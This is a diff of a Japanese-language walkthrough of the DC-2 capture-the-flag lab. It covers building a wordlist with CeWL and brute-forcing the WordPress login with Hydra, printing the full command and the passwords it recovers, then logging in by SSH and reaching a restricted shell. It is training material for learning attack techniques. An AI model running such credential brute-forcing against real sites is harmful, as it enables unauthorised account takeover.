@@ -240,26 +240,20 @@ MAC Address: 08:00:27:0B:F4:E8 (Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 3.79 seconds
 ```
+`admin`,`jerry`.`tom`ユーザーが存在することが判明しました。
+
+
+ここで、先ほどの`Flag 1`ページで`CeWL`を用いるヒントが示されていました。
+`CeWL`で辞書ファイルを生成し、`Hydra`を用いてそれぞれのユーザーに対して攻撃を試みます。
+ログインに失敗するとDC-2の画面上に"incorrect"と表示されていることが確認されたので、`Hydra`のコマンドにそれを含めました。
+ここで、`dict.txt`は`cewl`で作成した辞書ファイル、`user.txt`はユーザーリストです。
 ```bash
 ┌─[user@parrot]─[~/hacking-lab-logs/DC2]
 └──╼ $cewl -m 5 -w dict.txt http://dc-2
 CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
-
-┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
-└──╼ $hydra -L users.txt -P dict.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect'
-Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 ```
 
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 14:25:07
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 495 login tries (l:3/p:165), ~31 tries per task
-[DATA] attacking http-post-form://dc-2:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect
-[80][http-post-form] host: dc-2   login: jerry   password: adipiscing
-[STATUS] 421.00 tries/min, 421 tries in 00:01h, 74 to do in 00:01h, 16 active
-[80][http-post-form] host: dc-2   login: tom   password: parturient
-1 of 1 target successfully completed, 2 valid passwords found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-22 14:26:18
-
+```bash
 ┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
 └──╼ $hydra -L users.txt -P dict.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect'
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -272,7 +266,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 14:25:
 [80][http-post-form] host: dc-2   login: tom   password: parturient
 1 of 1 target successfully completed, 2 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-22 14:26:18
+```
 
+```bash
 ┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
 └──╼ $ssh jerry@$IP -p 7744 
 jerry@192.168.56.110's password: 
@@ -289,6 +285,7 @@ individual files in /usr/share/doc/*/copyright.
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 tom@DC-2:~$ 
+```
 
 tom@DC-2:~$ whoami
 -rbash: whoami: command not found
